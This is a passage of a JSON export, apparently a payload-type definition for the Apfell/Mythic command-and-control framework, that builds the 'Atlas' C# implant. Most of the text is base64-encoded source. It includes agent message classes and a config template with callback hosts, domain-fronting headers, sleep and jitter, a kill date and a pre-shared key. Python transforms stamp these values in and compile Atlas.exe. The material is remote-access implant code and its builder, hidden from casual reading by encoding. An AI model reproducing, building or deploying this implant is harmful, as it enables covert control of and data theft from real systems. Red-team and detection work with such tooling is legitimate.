gICAgICAgICAgICAgICByZXR1cm4gbmV3IFVwbG9hZFJlc3BvbnNlDQogICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICBhY3Rpb24gPSBwYXJzZUxpc3RbMF0sDQogICAgICAgICAgICAgICAgICAgIHRvdGFsX2NodW5rcyA9IEludDMyLlBhcnNlKHBhcnNlTGlzdFsxXSksDQogICAgICAgICAgICAgICAgICAgIGNodW5rX251bSA9IEludDMyLlBhcnNlKHBhcnNlTGlzdFsyXSksDQogICAgICAgICAgICAgICAgICAgIGNodW5rX2RhdGEgPSBwYXJzZUxpc3RbM10sDQogICAgICAgICAgICAgICAgICAgIGZpbGVfaWQgPSBwYXJzZUxpc3RbNF0sDQogICAgICAgICAgICAgICAgICAgIHRhc2tfaWQgPSBwYXJzZUxpc3RbNV0NCiAgICAgICAgICAgICAgICB9Ow0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQoNCiAgICAgICAgcHVibGljIGNsYXNzIERvd25sb2FkUmVzcG9uc2UNCiAgICAgICAgew0KICAgICAgICAgICAgcHVibGljIHN0cmluZyBzdGF0dXMgeyBnZXQ7IHNldDsgfQ0KICAgICAgICAgICAgcHVibGljIHN0cmluZyBmaWxlX2lkIHsgZ2V0OyBzZXQ7IH0NCiAgICAgICAgICAgIHB1YmxpYyBzdHJpbmcgdGFza19pZCB7IGdldDsgc2V0OyB9DQoNCiAgICAgICAgICAgIHB1YmxpYyBzdGF0aWMgc3RyaW5nIERvd25sb2FkUmVzcG9uc2VGb3JtYXQgPSBAInt7IiJzdGF0dXMiIjogIiJ7MH0iIiwgIiJmaWxlX2lkIiI6ICIiezF9IiIsICIidGFza19pZCIiOiAiInsyfSIifX0iOw0KDQogICAgICAgICAgICBwdWJsaWMgc3RhdGljIExpc3Q8c3RyaW5nPiBQYXJzZShzdHJpbmcgZGF0YSwgc3RyaW5nIGZvcm1hdCkNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICBmb3JtYXQgPSBSZWdleC5Fc2NhcGUoZm9ybWF0KS5SZXBsYWNlKCJcXHsiLCBAInsiKTsNCiAgICAgICAgICAgICAgICBpZiAoZm9ybWF0LkNvbnRhaW5zKCJ7MH0iKSkgeyBmb3JtYXQgPSBmb3JtYXQuUmVwbGFjZSgiezB9IiwgIig\/J2dyb3VwMCcuKikiKTsgfQ0KICAgICAgICAgICAgICAgIGlmIChmb3JtYXQuQ29udGFpbnMoInsxfSIpKSB7IGZvcm1hdCA9IGZvcm1hdC5SZXBsYWNlKCJ7MX0iLCAiKD8nZ3JvdXAxJy4qKSIpOyB9DQogICAgICAgICAgICAgICAgaWYgKGZvcm1hdC5Db250YWlucygiezJ9IikpIHsgZm9ybWF0ID0gZm9ybWF0LlJlcGxhY2UoInsyfSIsICIoPydncm91cDInLiopIik7IH0NCiAgICAgICAgICAgICAgICBNYXRjaCBtYXRjaCA9IG5ldyBSZWdleChmb3JtYXQpLk1hdGNoKGRhdGEuUmVwbGFjZShAIlwiLCBAIiIpKTsNCiAgICAgICAgICAgICAgICBMaXN0PHN0cmluZz4gbWF0Y2hlcyA9IG5ldyBMaXN0PHN0cmluZz4oKTsNCiAgICAgICAgICAgICAgICBpZiAobWF0Y2guR3JvdXBzWyJncm91cDAiXSAhPSBudWxsKSB7IG1hdGNoZXMuQWRkKG1hdGNoLkdyb3Vwc1siZ3JvdXAwIl0uVmFsdWUpOyB9DQogICAgICAgICAgICAgICAgaWYgKG1hdGNoLkdyb3Vwc1siZ3JvdXAxIl0gIT0gbnVsbCkgeyBtYXRjaGVzLkFkZChtYXRjaC5Hcm91cHNbImdyb3VwMSJdLlZhbHVlKTsgfQ0KICAgICAgICAgICAgICAgIGlmIChtYXRjaC5Hcm91cHNbImdyb3VwMiJdICE9IG51bGwpIHsgbWF0Y2hlcy5BZGQobWF0Y2guR3JvdXBzWyJncm91cDIiXS5WYWx1ZSk7IH0NCiAgICAgICAgICAgICAgICByZXR1cm4gbWF0Y2hlczsNCiAgICAgICAgICAgIH0NCg0KICAgICAgICAgICAgcHVibGljIHN0YXRpYyBEb3dubG9hZFJlc3BvbnNlIEZyb21Kc29uKHN0cmluZyBtZXNzYWdlKQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIExpc3Q8c3RyaW5nPiBwYXJzZUxpc3QgPSBEb3dubG9hZFJlc3BvbnNlLlBhcnNlKG1lc3NhZ2UsIERvd25sb2FkUmVzcG9uc2VGb3JtYXQuUmVwbGFjZSgie3siLCAieyIpLlJlcGxhY2UoIn19IiwgIn0iKSk7DQogICAgICAgICAgICAgICAgaWYgKHBhcnNlTGlzdC5Db3VudCAhPSA1KSB7IHJldHVybiBudWxsOyB9DQogICAgICAgICAgICAgICAgcmV0dXJuIG5ldyBEb3dubG9hZFJlc3BvbnNlDQogICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICBzdGF0dXMgPSBwYXJzZUxpc3RbMF0sDQogICAgICAgICAgICAgICAgICAgIGZpbGVfaWQgPSBwYXJzZUxpc3RbMV0sDQogICAgICAgICAgICAgICAgICAgIHRhc2tfaWQgPSBwYXJzZUxpc3RbMl0NCiAgICAgICAgICAgICAgICB9Ow0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQoNCiAgICAgICAgcHVibGljIGNsYXNzIEdldFN0YWdlDQogICAgICAgIHsNCiAgICAgICAgICAgIHB1YmxpYyBzdHJpbmcgYWN0aW9uIHsgZ2V0OyBzZXQ7IH0NCiAgICAgICAgICAgIHB1YmxpYyBzdHJpbmcgcHViX2tleSB7IGdldDsgc2V0OyB9DQogICAgICAgICAgICBwdWJsaWMgc3RyaW5nIHNlc3Npb25faWQgeyBnZXQ7IHNldDsgfQ0KDQogICAgICAgICAgICBwdWJsaWMgc3RyaW5nIEpzb25Gb3JtYXQgPSBAInt7IiJhY3Rpb24iIjoiInswfSIiLCIicHViX2tleSIiOiIiezF9IiIsIiJzZXNzaW9uX2lkIiI6IiJ7Mn0iIn19IjsNCg0KICAgICAgICAgICAgcHVibGljIHN0YXRpYyBzdHJpbmcgVG9Kc29uKEdldFN0YWdlIGdldF9zdGFnZSkNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICByZXR1cm4gU3RyaW5nLkZvcm1hdCgNCiAgICAgICAgICAgICAgICAgICAgZ2V0X3N0YWdlLkpzb25Gb3JtYXQsDQogICAgICAgICAgICAgICAgICAgIEphdmFTY3JpcHRTdHJpbmdFbmNvZGUoZ2V0X3N0YWdlLmFjdGlvbiksDQogICAgICAgICAgICAgICAgICAgIEphdmFTY3JpcHRTdHJpbmdFbmNvZGUoZ2V0X3N0YWdlLnB1Yl9rZXkpLA0KICAgICAgICAgICAgICAgICAgICBKYXZhU2NyaXB0U3RyaW5nRW5jb2RlKGdldF9zdGFnZS5zZXNzaW9uX2lkKQ0KICAgICAgICAgICAgICAgICk7DQogICAgICAgICAgICB9DQogICAgICAgIH0NCg0KICAgICAgICBwdWJsaWMgY2xhc3MgU3RhZ2VSZXNwb25zZQ0KICAgICAgICB7DQogICAgICAgICAgICBwdWJsaWMgc3RyaW5nIGFjdGlvbiB7IGdldDsgc2V0OyB9DQogICAgICAgICAgICBwdWJsaWMgc3RyaW5nIHV1aWQgeyBnZXQ7IHNldDsgfQ0KICAgICAgICAgICAgcHVibGljIHN0cmluZyBzZXNzaW9uX2tleSB7IGdldDsgc2V0OyB9DQogICAgICAgICAgICBwdWJsaWMgc3RyaW5nIHNlc3Npb25faWQgeyBnZXQ7IHNldDsgfQ0KDQoNCiAgICAgICAgICAgIHB1YmxpYyBzdGF0aWMgc3RyaW5nIEpzb25Gb3JtYXQgPSBAInt7IiJ1dWlkIiI6ICIiezB9IiIsICIic2Vzc2lvbl9rZXkiIjogIiJ7MX0iIiwgIiJhY3Rpb24iIjogIiJ7Mn0iIiwgIiJzZXNzaW9uX2lkIiI6ICIiezN9IiJ9fSI7DQoNCiAgICAgICAgICAgIHB1YmxpYyBzdGF0aWMgTGlzdDxzdHJpbmc+IFBhcnNlKHN0cmluZyBkYXRhLCBzdHJpbmcgZm9ybWF0KQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIGZvcm1hdCA9IFJlZ2V4LkVzY2FwZShmb3JtYXQpLlJlcGxhY2UoIlxceyIsIEAieyIpOw0KICAgICAgICAgICAgICAgIGlmIChmb3JtYXQuQ29udGFpbnMoInswfSIpKSB7IGZvcm1hdCA9IGZvcm1hdC5SZXBsYWNlKCJ7MH0iLCAiKD8nZ3JvdXAwJy4qKSIpOyB9DQogICAgICAgICAgICAgICAgaWYgKGZvcm1hdC5Db250YWlucygiezF9IikpIHsgZm9ybWF0ID0gZm9ybWF0LlJlcGxhY2UoInsxfSIsICIoPydncm91cDEnLiopIik7IH0NCiAgICAgICAgICAgICAgICBpZiAoZm9ybWF0LkNvbnRhaW5zKCJ7Mn0iKSkgeyBmb3JtYXQgPSBmb3JtYXQuUmVwbGFjZSgiezJ9IiwgIig\/J2dyb3VwMicuKikiKTsgfQ0KICAgICAgICAgICAgICAgIGlmIChmb3JtYXQuQ29udGFpbnMoInszfSIpKSB7IGZvcm1hdCA9IGZvcm1hdC5SZXBsYWNlKCJ7M30iLCAiKD8nZ3JvdXAzJy4qKSIpOyB9DQogICAgICAgICAgICAgICAgTWF0Y2ggbWF0Y2ggPSBuZXcgUmVnZXgoZm9ybWF0KS5NYXRjaChkYXRhLlJlcGxhY2UoQCJcIiwgQCIiKSk7DQogICAgICAgICAgICAgICAgTGlzdDxzdHJpbmc+IG1hdGNoZXMgPSBuZXcgTGlzdDxzdHJpbmc+KCk7DQogICAgICAgICAgICAgICAgaWYgKG1hdGNoLkdyb3Vwc1siZ3JvdXAwIl0gIT0gbnVsbCkgeyBtYXRjaGVzLkFkZChtYXRjaC5Hcm91cHNbImdyb3VwMCJdLlZhbHVlKTsgfQ0KICAgICAgICAgICAgICAgIGlmIChtYXRjaC5Hcm91cHNbImdyb3VwMSJdICE9IG51bGwpIHsgbWF0Y2hlcy5BZGQobWF0Y2guR3JvdXBzWyJncm91cDEiXS5WYWx1ZSk7IH0NCiAgICAgICAgICAgICAgICBpZiAobWF0Y2guR3JvdXBzWyJncm91cDIiXSAhPSBudWxsKSB7IG1hdGNoZXMuQWRkKG1hdGNoLkdyb3Vwc1siZ3JvdXAyIl0uVmFsdWUpOyB9DQogICAgICAgICAgICAgICAgaWYgKG1hdGNoLkdyb3Vwc1siZ3JvdXAzIl0gIT0gbnVsbCkgeyBtYXRjaGVzLkFkZChtYXRjaC5Hcm91cHNbImdyb3VwMyJdLlZhbHVlKTsgfQ0KICAgICAgICAgICAgICAgIHJldHVybiBtYXRjaGVzOw0KICAgICAgICAgICAgfQ0KDQogICAgICAgICAgICBwdWJsaWMgc3RhdGljIFN0YWdlUmVzcG9uc2UgRnJvbUpzb24oc3RyaW5nIG1lc3NhZ2UpDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgTGlzdDxzdHJpbmc+IHBhcnNlTGlzdCA9IFN0YWdlUmVzcG9uc2UuUGFyc2UobWVzc2FnZSwgSnNvbkZvcm1hdC5SZXBsYWNlKCJ7eyIsICJ7IikuUmVwbGFjZSgifX0iLCAifSIpKTsNCiAgICAgICAgICAgICAgICBpZiAocGFyc2VMaXN0LkNvdW50ICE9IDQpIHsgcmV0dXJuIG51bGw7IH0NCiAgICAgICAgICAgICAgICByZXR1cm4gbmV3IFN0YWdlUmVzcG9uc2UNCiAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgIGFjdGlvbiA9IHBhcnNlTGlzdFsyXSwNCiAgICAgICAgICAgICAgICAgICAgdXVpZCA9IHBhcnNlTGlzdFswXSwNCiAgICAgICAgICAgICAgICAgICAgc2Vzc2lvbl9rZXkgPSBwYXJzZUxpc3RbMV0sDQogICAgICAgICAgICAgICAgICAgIHNlc3Npb25faWQgPSBwYXJzZUxpc3RbM10NCiAgICAgICAgICAgICAgICB9Ow0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQogICAgfQ0KfQ0K"},{"Http_4.0.cs":"77u\"}],"c2_profiles":{"default":[{"Config_temp.cs":"77u\/dXNpbmcgU3lzdGVtLkNvbGxlY3Rpb25zLkdlbmVyaWM7DQoNCm5hbWVzcGFjZSBBdGxhcw0Kew0KICAgIHB1YmxpYyBjbGFzcyBDb25maWcNCiAgICB7DQogICAgICAgIHB1YmxpYyBzdGF0aWMgTGlzdDxzdHJpbmc+IENhbGxiYWNrSG9zdHMgPSBuZXcgTGlzdDxzdHJpbmc+IHsgImNhbGxiYWNrX2hvc3Q6Y2FsbGJhY2tfcG9ydCIgfTsNCiAgICAgICAgcHVibGljIHN0YXRpYyBMaXN0PFV0aWxzLlNlcnZlcj4gU2VydmVycyA9IG5ldyBMaXN0PFV0aWxzLlNlcnZlcj4geyB9Ow0KICAgICAgICBwdWJsaWMgc3RhdGljIHN0cmluZyBQYXlsb2FkVVVJRCA9ICIlVVVJRCUiOw0KICAgICAgICBwdWJsaWMgc3RhdGljIHN0cmluZyBVVUlEID0gIiI7DQogICAgICAgIHB1YmxpYyBzdGF0aWMgc3RyaW5nIFVzZXJBZ2VudCA9ICJVU0VSX0FHRU5UIjsNCiAgICAgICAgcHVibGljIHN0YXRpYyBzdHJpbmcgSG9zdEhlYWRlciA9ICJkb21haW5fZnJvbnQiOw0KICAgICAgICBwdWJsaWMgc3RhdGljIGludCBTbGVlcCA9IGNhbGxiYWNrX2ludGVydmFsOw0KICAgICAgICBwdWJsaWMgc3RhdGljIGludCBKaXR0ZXIgPSBjYWxsYmFja19qaXR0ZXI7DQogICAgICAgIHB1YmxpYyBzdGF0aWMgc3RyaW5nIEtpbGxEYXRlID0gImtpbGxkYXRlIjsNCiAgICAgICAgcHVibGljIHN0YXRpYyBzdHJpbmcgUGFyYW0gPSAiaWQiOw0KICAgICAgICBwdWJsaWMgY29uc3QgaW50IENodW5rU2l6ZSA9IDUxMjAwMDsNCiAgICAgICAgcHVibGljIHN0YXRpYyBib29sIERlZmF1bHRQcm94eSA9IHRydWU7DQogICAgICAgIHB1YmxpYyBzdGF0aWMgc3RyaW5nIFByb3h5QWRkcmVzcyA9ICIiOw0KICAgICAgICBwdWJsaWMgc3RhdGljIHN0cmluZyBQcm94eVVzZXIgPSAiIjsNCiAgICAgICAgcHVibGljIHN0YXRpYyBzdHJpbmcgUHJveHlQYXNzd29yZCA9ICIiOw0KI2lmIChERUZBVUxUIHx8IERFRlVMQVRfUFNLIHx8IERFRkFVTFRfRUtFKQ0KICAgICAgICBwdWJsaWMgc3RhdGljIHN0cmluZyBVcmwgPSAiL2FwaS92MS40L2FnZW50X21lc3NhZ2UiOw0KI2VuZGlmDQojaWYgKERlZmF1bHRfUFNLIHx8IERFRkFVTFRfRUtFKQ0KICAgICAgICBwdWJsaWMgc3RhdGljIHN0cmluZyBQc2sgPSAiQUVTUFNLIjsNCiNlbmRpZg0KI2lmIERFRkFVTFRfRUtFDQogICAgICAgIHB1YmxpYyBzdGF0aWMgc3RyaW5nIFNlc3Npb25JZCA9ICIiOw0KICAgICAgICBwdWJsaWMgc3RhdGljIHN0cmluZyB0ZW1wVVVJRCA9ICIiOw0KICAgICAgICBwdWJsaWMgc3RhdGljIFN5c3RlbS5TZWN1cml0eS5DcnlwdG9ncmFwaHkuUlNBQ3J5cHRvU2VydmljZVByb3ZpZGVyIFJzYTsNCiNlbmRpZg0KICAgICAgICBwdWJsaWMgc3RhdGljIERpY3Rpb25hcnk8c3RyaW5nLCBzdHJpbmc+IE1vZHVsZXMgPSBuZXcgRGljdGlvbmFyeTxzdHJpbmcsIHN0cmluZz4oKTsNCiAgICB9DQp9DQo="}]},"load_transforms":[],"create_transforms":[{"parameter":"x86\nx64\nanycpu","description":"Architecture to target when compiling","transform":"save_parameter","parameter_type":"ChooseOne","order":2},{"parameter":"DEFAULT\nDEFAULT_PSK\nDEFAULT_EKE","description":"Profile\/encryption to use","transform":"save_parameter","parameter_type":"ChooseOne","order":3},{"parameter":"id","description":"Specify the query parameter to use for GET requests","transform":"save_string_parameter","parameter_type":"String","order":4},{"parameter":"512000","description":"Specify the chunking size to use for download\/upload and command output","transform":"save_string_parameter","parameter_type":"String","order":5},{"parameter":"true\nfalse","description":"True will use the system's default proxy settings, false will use proxy settings specify below","transform":"save_parameter","parameter_type":"ChooseOne","order":6},{"parameter":"3.5\n4.0","description":"","transform":"save_parameter","parameter_type":"ChooseOne","order":1},{"parameter":"","description":"(Optional) Specify the proxy address to use for web requests ","transform":"save_string_parameter","parameter_type":"String","order":7},{"parameter":"","description":"(Optional) Specify the password to use to authenticate to the proxy server","transform":"save_string_parameter","parameter_type":"String","order":8},{"parameter":"","description":"(Optional) Specify the username to use to authenticate to the proxy server","transform":"save_string_parameter","parameter_type":"String","order":9},{"parameter":"","description":"Compile Atlas payload","transform":"atlas_compile_and_return","parameter_type":"None","order":11},{"parameter":"","description":"","transform":"atlas_stamp_parameters","parameter_type":"None","order":10}],"transforms":[{"code":"YXN5bmMgZGVmIHN3YXBfc2hvcnRuYW1lcyhzZWxmLCB0YXNrX3BhcmFtczogc3RyLCBwYXJhbWV0ZXI6IE5vbmUpIC0+IHN0cjoNCiAgICAjIHNldHMgYSBmbGFnIHRvIHN3YXAgcGFyYW1ldGVycyB0aGF0IGVuZCBpbiBfaWQgd2l0aCBmaWxlbmFtZXMgaWYgdGhlIGN1cnJlbnQgdmFsdWUgZXhpc3RzIGFzIGEgZmlsZSBuYW1lDQogICAgaW1wb3J0IGpzb24NCiAgICB0cnk6DQogICAgICAgIHBhcmFtcyA9IGpzb24ubG9hZHModGFza19wYXJhbXMpDQogICAgICAgIHBhcmFtc1snc3dhcF9zaG9ydG5hbWVzJ10gPSBUcnVlDQogICAgICAgIHJldHVybiBqc29uLmR1bXBzKHBhcmFtcykNCiAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6DQogICAgICAgIHByaW50KCJjYW4ndCBhZGQgc3dhcF9zaG9ydG5hbWVzIGZpZWxkIHNpbmNlIGl0J3Mgbm90IGpzb24iKQ0KICAgIHJldHVybiB0YXNrX3BhcmFtcw==","name":"swap_shortnames","parameter_type":"None","description":"Swap *_id parameter filename to corresponding file_id","is_command_code":true,"timestamp":"02\/27\/2020 22:45:51","id":13,"operator":"apfell_admin"},{"code":"YXN5bmMgZGVmIGF0bGFzX3J1bmFzc2VtYmx5X3Nob3J0aGFuZChzZWxmLCB0YXNrX3BhcmFtczpzdHIsIHBhcmFtZXRlcjogTm9uZSkgLT4gc3RyOg0KICAgIGltcG9ydCBqc29uDQogICAgaW1wb3J0IHNobGV4DQogICAgdHJ5Og0KICAgICAgICBqc29uLmxvYWRzKHRhc2tfcGFyYW1zKQ0KICAgICAgICByZXR1cm4gdGFza19wYXJhbXMgICMgaWYgaXQncyBhbHJlYWR5IEpTT04sIGxldCBpdCBiZQ0KICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToNCiAgICAgICAgcGFzcw0KICAgIGZpbGVzID0gc2hsZXguc3BsaXQodGFza19wYXJhbXMpDQogICAgdGFza19kaWN0ID0geyJhc3NlbWJseV9pZCI6IGZpbGVzWzBdLCAiYXJncyI6ICcgJy5qb2luKGZpbGVzWzE6XSl9DQogICAgcmV0dXJuIGpzb24uZHVtcHModGFza19kaWN0KQ==","name":"atlas_runassembly_shorthand","parameter_type":"None","description":"Swap out filename for needed file_id","is_command_code":true,"timestamp":"02\/27\/2020 22:42:46","id":11,"operator":"apfell_admin"},{"code":"YXN5bmMgZGVmIGF0bGFzX3VwbG9hZF9zaG9ydGhhbmQoc2VsZiwgdGFza19wYXJhbXM6c3RyLCBwYXJhbWV0ZXI6IE5vbmUpIC0+IHN0cjoNCiAgICBpbXBvcnQganNvbg0KICAgIGltcG9ydCBzaGxleA0KICAgIHRyeToNCiAgICAgICAganNvbi5sb2Fkcyh0YXNrX3BhcmFtcykNCiAgICAgICAgcmV0dXJuIHRhc2tfcGFyYW1zICAjIGlmIGl0J3MgYWxyZWFkeSBKU09OLCBsZXQgaXQgYmUNCiAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6DQogICAgICAgIHBhc3MNCiAgICBmaWxlcyA9IHNobGV4LnNwbGl0KHRhc2tfcGFyYW1zKQ0KICAgIHRhc2tfZGljdCA9IHsiYXNzZW1ibHlfaWQiOiBmaWxlc1swXSwgInJlbW90ZV9wYXRoIjogJyAnLmpvaW4oZmlsZXNbMTpdKX0NCiAgICByZXR1cm4ganNvbi5kdW1wcyh0YXNrX2RpY3Qp","name":"atlas_upload_shorthand","parameter_type":"None","description":"Swap out filename for needed file_id","is_command_code":true,"timestamp":"02\/27\/2020 22:43:34","id":12,"operator":"apfell_admin"},{"code":"YXN5bmMgZGVmIGF0bGFzX2xvYWRhc3NlbWJseV9zaG9ydGhhbmQoc2VsZiwgdGFza19wYXJhbXM6c3RyLCBwYXJhbWV0ZXI6IE5vbmUpIC0+IHN0cjoNCiAgICBpbXBvcnQganNvbg0KICAgIGltcG9ydCBzaGxleA0KICAgIHRyeToNCiAgICAgICAganNvbi5sb2Fkcyh0YXNrX3BhcmFtcykNCiAgICAgICAgcmV0dXJuIHRhc2tfcGFyYW1zICAjIGlmIGl0J3MgYWxyZWFkeSBKU09OLCBsZXQgaXQgYmUNCiAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6DQogICAgICAgIHBhc3MNCiAgICBmaWxlcyA9IHNobGV4LnNwbGl0KHRhc2tfcGFyYW1zKQ0KICAgIHRhc2tfZGljdCA9IHsiYXNzZW1ibHlfaWQiOiBmaWxlc1swXSwgInJlbW90ZV9wYXRoIjogIiJ9DQogICAgcmV0dXJuIGpzb24uZHVtcHModGFza19kaWN0KQ==","name":"atlas_loadassembly_shorthand","parameter_type":"None","description":"Swap out filenames for needed file_id","is_command_code":true,"timestamp":"02\/27\/2020 22:41:52","id":10,"operator":"apfell_admin"},{"code":"YXN5bmMgZGVmIHNhdmVfcGFyYW1ldGVyKHNlbGYsIHByaW9yX291dHB1dDogTm9uZSwgcGFyYW1ldGVyOiBzdHIpIC0+IE5vbmU6CiAgICBzZWxmLnNhdmVkX2FycmF5LmFwcGVuZChwYXJhbWV0ZXIpCiAgICByZXR1cm4gTm9uZQ==","name":"save_parameter","parameter_type":"ChooseOne","description":"Save a value as the next element in self.saved_array","is_command_code":false,"timestamp":"02\/27\/2020 19:08:01","id":8,"operator":"apfell_admin"},{"code":"YXN5bmMgZGVmIHNhdmVfc3RyaW5nX3BhcmFtZXRlcihzZWxmLCBwcmlvcl9vdXRwdXQ6IE5vbmUsIHBhcmFtZXRlcjogc3RyKSAtPiBOb25lOgogICAgc2VsZi5zYXZlZF9hcnJheS5hcHBlbmQocGFyYW1ldGVyKQogICAgcmV0dXJuIE5vbmU=","name":"save_string_parameter","parameter_type":"String","description":"Save a string parameter to saved_array","is_command_code":false,"timestamp":"02\/29\/2020 23:11:11","id":14,"operator":"apfell_admin"},{"code":"YXN5bmMgZGVmIGF0bGFzX2NvbXBpbGVfYW5kX3JldHVybihzZWxmLCBwcmlvcl9vdXRwdXQ6IE5vbmUsIHBhcmFtZXRlcjogc3RyKSAtPiBieXRlYXJyYXk6DQogICAgdHJ5Og0KICAgICAgICBpZiBsZW4oc2VsZi5zYXZlZF9hcnJheSkgPCA2Og0KICAgICAgICAgICAgcmFpc2UgRXhjZXB0aW9uKCJJbmNvcnJlY3QgbnVtYmVyIG9mIHNhdmVkIGFyZ3VtZW50cyIpDQogICAgICAgIGFyY2ggPSBzZWxmLnNhdmVkX2FycmF5WzFdDQogICAgICAgIHByb2ZpbGUgPSBzZWxmLnNhdmVkX2FycmF5WzJdDQogICAgICAgIGlmIHNlbGYuc2F2ZWRfYXJyYXlbMF0gPT0gIjQuMCI6DQogICAgICAgICAgICBjb21tYW5kID0gIi91c3IvYmluL21jcyAtdGFyZ2V0OndpbmV4ZSAtc2RrOjMuNSAtcGxhdGZvcm06e30gLWRlZmluZTpcIlRSQUNFLHt9XCIgLW9wdGltaXplKyAtb3V0OkF0bGFzLmV4ZSBDb25maWcuY3MgIENyeXB0by5jcyAgSHR0cF80LjAuY3MgTW9kdWxlcy5jcyAgUHJvZ3JhbS5jcyBVdGlscy5jcyIuZm9ybWF0KGFyY2gsIHByb2ZpbGUpDQogICAgICAgIGVsaWYgc2VsZi5zYXZlZF9hcnJheVswXSA9PSAiMy41IjoNCiAgICAgICAgICAgIGNvbW1hbmQgPSAiL3Vzci9iaW4vZ21jcyAvbm9jb25maWcgL2RlYnVnLSAvb3B0aW1pemUrIC9vdXQ6QXRsYXMuZXhlIENvbmZpZy5jcyBDcnlwdG8uY3MgSHR0cF8zLjUuY3MgTW9kdWxlcy5jcyBQcm9ncmFtLmNzIFV0aWxzLmNzIC90YXJnZXQ6d2luZXhlIC9kZWZpbmU6VFJBQ0Use30gL3BsYXRmb3JtOnt9IC9yZWZlcmVuY2U6L3Vzci9saWIvbW9uby8yLjAvU3lzdGVtLmRsbCAvcmVmZXJlbmNlOi91c3IvbGliL21vbm8vMi4wL1N5c3RlbS5YbWwuTGlucS5kbGwgL3JlZmVyZW5jZTovdXNyL2xpYi9tb25vLzIuMC9TeXN0ZW0uRGF0YS5EYXRhU2V0RXh0ZW5zaW9ucy5kbGwgL3JlZmVyZW5jZTovdXNyL2xpYi9tb25vL2dhYy9NaWNyb3NvZnQuQ1NoYXJwLzQuMC4wLjBfX2IwM2Y1ZjdmMTFkNTBhM2EvTWljcm9zb2Z0LkNTaGFycC5kbGwgL3JlZmVyZW5jZTovdXNyL2xpYi9tb25vLzIuMC9TeXN0ZW0uRGF0YS5kbGwgL3JlZmVyZW5jZTovdXNyL2xpYi9tb25vLzIuMC9TeXN0ZW0uWG1sLmRsbCAvcmVmZXJlbmNlOi91c3IvbGliL21vbm8vMi4wL1N5c3RlbS5Db3JlLmRsbCAvd2Fybjo0Ii5mb3JtYXQocHJvZmlsZSwgYXJjaCkNCiAgICAgICAgcHJvYyA9IGF3YWl0IGFzeW5jaW8uY3JlYXRlX3N1YnByb2Nlc3Nfc2hlbGwoY29tbWFuZCwgc3Rkb3V0PWFzeW5jaW8uc3VicHJvY2Vzcy5QSVBFLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHN0ZGVycj1hc3luY2lvLnN1YnByb2Nlc3MuUElQRSwgY3dkPXNlbGYud29ya2luZ19kaXIpDQogICAgICAgIHN0ZG91dCwgc3RkZXJyID0gYXdhaXQgcHJvYy5jb21tdW5pY2F0ZSgpDQogICAgICAgIGlmIHN0ZG91dDoNCiAgICAgICAgICAgIHByaW50KGYnW3N0ZG91dF1cbntzdGRvdXQuZGVjb2RlKCl9JykNCiAgICAgICAgaWYgc3RkZXJyOg0KICAgICAgICAgICAgcHJpbnQoZidbc3RkZXJyXVxue3N0ZGVyci5kZWNvZGUoKX0nKQ0KICAgICAgICBpZiBvcy5wYXRoLmV4aXN0cygie30vQXRsYXMuZXhlIi5mb3JtYXQoc2VsZi53b3JraW5nX2RpcikpOg0KICAgICAgICAgICAgcmV0dXJuIGJ5dGVhcnJheShvcGVuKCJ7fS9BdGxhcy5leGUiLmZvcm1hdChzZWxmLndvcmtpbmdfZGlyKSwgJ3JiJykucmVhZCgpKQ0KICAgICAgICBlbHNlOg0KICAgICAgICAgICAgIyBzb21ldGhpbmcgd2VudCB3cm9uZywgcmV0dXJuIG91ciBlcnJvcnMNCiAgICAgICAgICAgIHJhaXNlIEV4Y2VwdGlvbihzdGRlcnIuZGVjb2RlKCkpDQogICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOg0KICAgICAgICByYWlzZSBFeGNlcHRpb24oc3RkZXJyLmRlY29kZSgpICsgc3Rkb3V0LmRlY29kZSgpKQ==","name":"atlas_compile_and_return","parameter_type":"None","description":"Compile atlas payload","is_command_code":false,"timestamp":"03\/01\/2020 00:00:32","id":15,"operator":"apfell_admin"},{"code":"YXN5bmMgZGVmIGF0bGFzX3N0YW1wX3BhcmFtZXRlcnMoc2VsZiwgcHJpb3Jfb3V0cHV0OiBOb25lLCBwYXJhbWV0ZXI6IHN0cikgLT4gYnl0ZWFycmF5OgogICAgaWYgbGVuKHNlbGYuc2F2ZWRfYXJyYXkpIDwgNjoKICAgICAgICByYWlzZSBFeGNlcHRpb24oIkluY29ycmVjdCBudW1iZXIgb2Ygc2F2ZWQgYXJndW1lbnRzIikKICAgIHV1aWQgPSBvcGVuKCJ7fS9VdWlkLnR4dCIuZm9ybWF0KHNlbGYud29ya2luZ19kaXIpLCAncicpLnJlYWQoKQogICAgZmlsZTEgPSBvcGVuKCJ7fS9Db25maWdfdGVtcC5jcyIuZm9ybWF0KHNlbGYud29ya2luZ19kaXIpLCAncicpLnJlYWQoKQogICAgZmlsZTIgPSBvcGVuKCJ7fS9Db25maWcuY3MiLmZvcm1hdChzZWxmLndvcmtpbmdfZGlyKSwgJ3cnKQogICAgZmlsZTEgPSBmaWxlMS5yZXBsYWNlKCIlVVVJRCUiLCB1dWlkLnN0cmlwKCkpCiAgICBmaWxlMS5yZXBsYWNlKCclUEFSQU0lJywgc2VsZi5zYXZlZF9hcnJheVszXSkKICAgIGZpbGUxLnJlcGxhY2UoJyVDSFVOS19TSVpFJScsIHNlbGYuc2F2ZWRfYXJyYXlbNF0pCiAgICBmaWxlMS5yZXBsYWNlKCclREVGQVVMVF9QUk9YWSUnLCBzZWxmLnNhdmVkX2FycmF5WzVdKQogICAgZmlsZTEucmVwbGFjZSgnJVBST1hZX0FERFJFU1MlJywgc2VsZi5zYXZlZF9hcnJheVs2XSkKICAgIGZpbGUxLnJlcGxhY2UoJyVQUk9